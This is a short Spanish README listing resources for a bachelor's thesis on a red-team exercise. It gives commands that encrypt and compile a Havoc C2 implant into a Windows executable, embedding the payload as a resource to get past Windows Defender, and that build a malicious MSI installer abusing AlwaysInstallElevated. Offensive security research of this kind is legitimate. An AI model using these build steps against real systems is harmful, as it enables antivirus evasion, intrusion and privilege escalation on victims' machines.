# Recursos del trabajo de fin de grado
Recursos utilizados para la realización del trabajo de fin de grado <em><b>Un ejercicio de Red Team</b></em>.
## Comandos para compilar el malware de Havoc
```
python3 aes.py demon.bin
x86_64-w64-mingw32-windres recursos.rc -o recursos.o
x86_64-w64-mingw32-g++ -o atx.exe havoc.cpp recursos.o --static
```
## Comandos para compilar el archivo MSI malicioso
```
wix convert plantilla.wxs
wix build -o setup.msi setup.wxs
```
## Créditos
[Gemini Security](https://github.com/gemini-security/How-to-bypass-Windows-Defender-with-Embedded-Resources-.rsrc-)

[Sabri](https://github.com/KINGSABRI/MSI-AlwaysInstallElevated/blob/master/WXS-Templates/alwaysInstallElevated-2.wxs)
